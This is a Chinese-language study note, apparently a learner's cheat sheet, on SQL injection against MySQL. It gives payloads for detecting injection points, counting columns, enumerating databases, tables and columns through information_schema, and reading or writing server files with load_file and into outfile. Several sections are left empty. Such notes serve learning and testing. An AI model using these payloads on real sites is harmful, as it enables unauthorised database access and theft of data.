# 																									SQL注入

## 1. 判断注入点

1. 老办法

   > and 1=1：页面正常
   >
   > and 1=2：页面错误

2. 新办法

## 2.猜测字段数量

1. order by x：直到正常和错误页面的临界值

## 3.信息收集

1. 数据库版本：version()
2. 数据库名称：database()
3. 数据库用户：user()
4. 操作系统：@@version_compile_os
5. 网站路径：@@datadir
6. 查看权限：select * from mysql.user where user='root'\G;  

## 4.information_schema

1. 查询所有数据库名

   > ```mysql
   > union select group_concat(schema_name) from information_schema.schemata
   > ```

2. 查询指定数据库表名

   > ```mysql
   > union select group_concat(table_name) from information_schema.tables where table_schema='databsename'
   > ```

3. 从指定数据库的指定表中查询列名

   > ```mysql
   > union select group_concat(column_name) from information_schema.columns where table_schema='databsename' and table_name='tablename'
   > ```

## 5.MySQL注入

1. 高权限注入

   1. 跨库注入  

   2. 文件读写操作
      需要先查看权限
      `SHOW VARIABLES LIKE "secure_file_priv";`
      更改权限为路径：在my.ini中添加`secure_file_priv = path `
      或者'='后面留空表示不限制。

      > 1. `select load_file('filename');`
      >
      > 2. `select 'string' into outfile 'filename/filepath'`或者 `select 'string' into dumpfile 'filename/filepath'`：导出函数 
      >
      > 3. 文件路径
      >
      >    > 当前目录：`load_file('filename')`
      >    >
      >    > 上级目录：`load_file('./filename')`
      >    >
      >    > 上上级目录：`load_file('../filename')`

   3. 获取路径常见方法

      >  报错显示，遗留文件，漏洞报错，平台配置文件，爆破
      >
      > 注：PHP 5.4可能存在magic_quotes_gpc魔术引号，可以通过将文件路径转为hex编码绕过

## 6.MySQL类型和提交注入

1. 简要明确参数类型

   > 1. 字符型需要先闭合单引号或者双引号参数形式为：
   >    单引号：`/?id=1' and 1=1`
   >    双引号：`/?id=1" and 1=1`
   >
   > 2.  搜索时模糊查询：
   >
   >    > select * from tablename where name like '%yourname%';
   >    >
   >    > 此时传入的参数就应该为：`/?id=name%' and 1=1`，或者单引号换成双引号也可以。
   >
   > 3. 语句还可能为：
   >
   >    > select * from users where name like ('%name%');
   >    >
   >    > 此时参数就需要闭合括号：`/?name=haha%'）and 1=1`

2. 简要明确请求方法

   > 1. GET：在URL提交参数
   > 2. POST：在请求头中
   > 3. COOKIE：在请求头中
   > 4. REQUEST：get和post都可以
   > 5. SERVER：获取用户的系统信息，可以使用多个内置参数。
   > 6. HTTP头：

## 7.Oracle和MongoDB注入













​	
